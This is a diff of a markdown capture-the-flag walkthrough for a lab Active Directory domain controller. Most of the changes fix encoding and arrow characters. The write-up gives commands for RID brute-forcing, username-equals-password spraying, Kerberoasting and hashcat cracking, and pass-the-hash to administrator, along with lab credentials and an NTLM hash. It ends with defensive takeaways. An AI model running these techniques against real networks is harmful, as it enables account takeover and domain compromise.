@@ -11,23 +11,23 @@
 ## Attack Chain Overview
 
 ```
-Anonymous SMB (guest) ? IPC$ accessible
-    ?
-RID Brute (nxc --rid-brute) ? domain user list
-    ?
-Password Spraying user==password ? ybob317:ybob317
-    ?
-SMB enum as ybob317 ? read user.txt from users share
-    ?
-Kerberoast (GetUserSPNs) ? file_svc TGS hash
-    ?
-hashcat -m 13100 ? file_svc:Password123!!
-    ?
-SMB read on \backup share ? backup_extract.txt with machine NTLM hashes
-    ?
+Anonymous SMB (guest)  IPC$ accessible
+    
+RID Brute (nxc --rid-brute)  domain user list
+    
+Password Spraying user==password  ybob317:ybob317
+    
+SMB enum as ybob317  read user.txt from users share
+    
+Kerberoast (GetUserSPNs)  file_svc TGS hash
+    
+hashcat -m 13100  file_svc:Password123!!
+    
+SMB read on \backup share  backup_extract.txt with machine NTLM hashes
+    
 Pass-the-Hash as FileServer$ (computer account in Domain Admins path)
-    ?
-wmiexec/winrm ? BUILTIN\Administrators ? Administrator flag
+    
+wmiexec/winrm  BUILTIN\Administrators  Administrator flag
 ```
 
 ---
@@ -35,10 +35,10 @@ wmiexec/winrm ? BUILTIN\Administrators ? Administrator flag
 ## Table of Contents
 1. [Reconnaissance](#reconnaissance)
 2. [Anonymous SMB & RID Brute](#anonymous-smb--rid-brute)
-3. [Password Spraying ? ybob317](#password-spraying--ybob317)
+3. [Password Spraying  ybob317](#password-spraying--ybob317)
 4. [User Flag](#user-flag)
-5. [Kerberoasting ? file_svc](#kerberoasting--file_svc)
-6. [Backup Share ? Machine Account Hash](#backup-share--machine-account-hash)
+5. [Kerberoasting  file_svc](#kerberoasting--file_svc)
+6. [Backup Share  Machine Account Hash](#backup-share--machine-account-hash)
 7. [Pass-the-Hash as FileServer$](#pass-the-hash-as-fileserver)
 8. [Root Flag](#root-flag)
 9. [Key Takeaways](#key-takeaways)
@@ -85,7 +85,7 @@ crackmapexec smb $TARGET -u '' -p ''
 enum4linux -a $TARGET
 ```
 
-`enum4linux` reports RID ranges **500Â–550** and **1000Â–1050** Â— the DC responds to SAMR queries with at least the guest account.
+`enum4linux` reports RID ranges **500–550** and **1000–1050** — the DC responds to SAMR queries with at least the guest account.
 
 ### Guest account is valid
 ```bash
@@ -99,7 +99,7 @@ crackmapexec smb $TARGET -u 'guest' -p '' --shares
 SMB   10.128.129.244  445  DC01  IPC$  READ  Remote IPC
 ```
 
-Guest can bind, only `IPC$` is readable Â— that is enough for RID-brute enumeration against LSARPC.
+Guest can bind, only `IPC$` is readable — that is enough for RID-brute enumeration against LSARPC.
 
 ### RID Brute via netexec
 ```bash
@@ -125,9 +125,9 @@ grep 'SOUPEDECODE\\' rid_brute.txt \
 
 ---
 
-## Password Spraying ? ybob317
+## Password Spraying  ybob317
 
-### AS-REP Roast (no pre-auth) Â— no hits
+### AS-REP Roast (no pre-auth) — no hits
 ```bash
 # What it does: attempt to extract AS-REP hashes for accounts with pre-authentication disabled.
 # Why here: identify high-value targets that allow offline password cracking without needing initial credentials.
@@ -141,7 +141,7 @@ nxc smb soupedecode.local -u usernames.txt -p usernames.txt \
   --no-brute --continue-on-success
 ```
 
-`--no-brute` switches the combo logic from NÃ—M to "N pairs" (line-for-line), which is how we test `username == password`. Hit:
+`--no-brute` switches the combo logic from N×M to "N pairs" (line-for-line), which is how we test `username == password`. Hit:
 
 ```
 SMB  10.128.129.244  445  DC01  [+] SOUPEDECODE.LOCAL\ybob317:ybob317
@@ -165,7 +165,7 @@ smbclient //$TARGET/users -U 'SOUPEDECODE.LOCAL/ybob317%ybob317' -c 'get ybob317
 
 ---
 
-## Kerberoasting ? file_svc
+## Kerberoasting  file_svc
 
 Any authenticated user can request TGS tickets for accounts with an SPN. If those accounts have weak passwords, the RC4-encrypted TGS is crackable offline.
 
@@ -197,7 +197,7 @@ netexec smb $TARGET -u 'file_svc' -p 'Password123!!'
 
 ---
 
-## Backup Share ? Machine Account Hash
+## Backup Share  Machine Account Hash
 
 `file_svc` has read access to a `backup` share that `ybob317` did not:
 
@@ -208,7 +208,7 @@ smbmap -H $TARGET -u 'file_svc' -p 'Password123!!' -r
 smbclient //$TARGET/backup -U 'file_svc%Password123!!'
 ```
 
-Download `backup_extract.txt`. The file contains **NTLM hashes for machine accounts** Â— the hashes look random and long because computer account passwords are 120-char auto-generated strings.
+Download `backup_extract.txt`. The file contains **NTLM hashes for machine accounts** — the hashes look random and long because computer account passwords are 120-char auto-generated strings.
 
 **Target line:**
 ```
@@ -219,7 +219,7 @@ FileServer$ : aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559
 
 ## Pass-the-Hash as FileServer$
 
-Machine accounts can be a dead end Â— but here `FileServer$` is a member of `Domain Admins` / has local admin on DC01 (this is the lab's intended path). PTH lets us authenticate without cracking.
+Machine accounts can be a dead end — but here `FileServer$` is a member of `Domain Admins` / has local admin on DC01 (this is the lab's intended path). PTH lets us authenticate without cracking.
 
 ```bash
 # What it does: perform a Pass-the-Hash attack using the machine account NTLM hash.
@@ -281,10 +281,10 @@ C:\> type C:\Users\Administrator\Desktop\root.txt
 5. **Machine accounts belong in least-privilege groups.** `FileServer$` should not be a Domain Admin.
 
 ### Related Notes
-- [netexec](../../../tools/recon/netexec.md) Â— RID brute, spraying, PTH
-- [impacket](../../../tools/windows/impacket.md) Â— `GetUserSPNs`, `wmiexec`
-- [hashcat](../../../tools/creds/hashcat.md) Â— `-m 13100` Kerberos TGS RC4
-- [evil-winrm](../../../tools/windows/evil-winrm.md) Â— hash-authenticated WinRM
+- [netexec](../../../tools/recon/netexec.md) — RID brute, spraying, PTH
+- [impacket](../../../tools/windows/impacket.md) — `GetUserSPNs`, `wmiexec`
+- [hashcat](../../../tools/creds/hashcat.md) — `-m 13100` Kerberos TGS RC4
+- [evil-winrm](../../../tools/windows/evil-winrm.md) — hash-authenticated WinRM
 - [SMB anonymous enumeration](../../../playbooks/enumeration/smb-anonymous.md)
 - [Password spraying](../../../exploits/ad/password-spraying.md)
 - [AS-REP Roast & Kerberoast](../../../exploits/ad/kerberos-roasting.md)
